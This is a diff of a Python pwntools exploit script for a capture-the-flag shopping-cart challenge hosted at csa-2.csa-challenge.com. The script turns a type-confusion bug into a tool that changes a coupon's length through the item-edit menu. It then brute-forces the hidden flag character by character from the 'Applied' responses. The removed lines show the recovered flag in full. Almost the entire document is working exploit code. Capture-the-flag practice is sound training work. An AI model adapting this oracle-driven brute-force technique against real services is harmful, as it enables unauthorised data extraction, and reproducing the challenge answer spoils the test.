@@ -1,93 +1,69 @@
 from pwn import *
 import string
 
-TYPE_UNDEFINED = 0
-TYPE_BREAD     = 'b'
-TYPE_PASTA     = 'p' 
-TYPE_SOUP      = 's'
-TYPE_DRINK     = 'd'
-TYPE_VEGETABLE = 'v'
-TYPE_FRUIT     = 'f'
-TYPE_COUPON    = 'c'
+log.level=0
 
-def menu():
+flag = "CSA{"
+EDIT_ITEM = "2"
+EDIT_AMOUNT_ITEMS = "3"
+EDIT_LOAVES = "4"
+COUPON_INDEX = "2"
+
+ALPHABET = string.printable
+
+def wait_menu_end():
     r.recvuntil("Checkout\r\n")
 
-def edit(index, propertyIndex, value):
-    menu()
-    #r.recvline()
-    r.sendline(str(index))
-    #print(r.recv())
-    #r.recvuntil("Cancel\r\n")
-    r.sendline(str(propertyIndex))
-    r.sendline(str(value))
-    #r.recvuntil("Item updated!\r\n")
+def edit_item(index, property, value):
+    wait_menu_end()
+    r.sendline(EDIT_ITEM)
+    r.recvuntil("edit?\r\n")
+    r.sendline(index)
+    r.recvuntil("Cancel\r\n")
+    r.sendline(property)
+    r.recvuntil("amount: ")
+    r.sendline(value)
+    
+def to_fruit_length_to_coupon():
+    global flag
+    """edits the coupon's length to len(flag) + 1"""
+    new_length = len(flag) + 1
+    edit_item(COUPON_INDEX, EDIT_LOAVES, str(new_length))
+    
+    edit_item(COUPON_INDEX, EDIT_AMOUNT_ITEMS, "0")
 
-def load_coupons():
-    menu()
+    wait_menu_end()
+    r.sendline(EDIT_ITEM)
+    r.recvuntil("edit?\r\n")
+    r.sendline(COUPON_INDEX)
+
+def bruteforce():
+    global flag
+    for c in ALPHABET:
+        wait_menu_end()
+        r.sendline("5")
+        r.recvuntil("Please enter your coupon:\r\n")
+        r.sendline(flag + c)
+        line = r.recvuntil("\r\n").decode()
+        if "Invalid" in line:
+            continue
+        if "Applied" in line:
+            print(f"found new flag: {flag}{c}")
+            flag += c
+            if c == "}":
+                print("finished!")
+                exit()
+            return
+        else:
+            print("something strage is afoot")
+            exit(0)
+
+while True:
+    r = remote('csa-2.csa-challenge.com', 2222)
+    wait_menu_end()
     r.sendline("5")
     r.recvuntil("Please enter your coupon:\r\n")
-    r.sendline("asdf")
-    r.recvuntil("Invalid coupon!\r\n")
-options = string.printable
+    r.sendline("AAAAAAA")
 
-flag = "CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}"
-#CSA{T
-
-r = remote("csa-2.csa-challenge.com", 2222)
-
-#load_coupons()
-#r.interactive()
-
-#edit(2, 4, 5)
-#for c in options:
-#    menu()
-#    r.sendline("5")
-#    r.recvuntil("Please enter your coupon:\r\n")
-#    r.sendline(f"{flag}{c}")
-#    line = r.recvline()
-#    if "Applied" in line:
-#        print(f"flag = {flag}{c}")
-#        break
-
-#r.interactive()
-r.recvuntil("6 - Checkout\r\n")
-r.sendline("5")
-r.recvuntil("\r\n")
-r.sendline("Grabage!")
-
-(r.recvuntil("6 - Checkout\r\n"))
-#r.interactive()
-r.sendline("2")
-r.recvuntil("Which item index would you like to edit?\r\n")
-r.sendline("2")
-r.recvuntil("Cancel\r\n")
-r.sendline("4")
-r.recvuntil("Enter new loaves amount: ")
-#len check
-r.sendline(str(len(flag) + 1))
-
-r.recvuntil("6 - Checkout\r\n")
-r.sendline("2")
-r.recvuntil("Which item index would you like to edit?\r\n")
-r.sendline("2")
-r.recvuntil("Cancel\r\n")
-r.sendline("3")
-r.recvuntil("Enter new items amount: ")
-r.sendline("0")
-
-r.recvuntil("6 - Checkout\r\n")
-r.sendline("2")
-r.recvuntil("Which item index would you like to edit?\r\n")
-r.sendline("2")
-
-for c in options:
-    r.recvuntil("6 - Checkout\r\n")
-    r.sendline("5")
-    r.recvuntil("\r\n")
-    r.sendline(flag + c)
-    line = r.recvuntil("\r\n")
-    if b"Applied" in line:
-        print(f"{flag}{c}")
-        print("woooho")
-        break
+    to_fruit_length_to_coupon()
+    bruteforce()
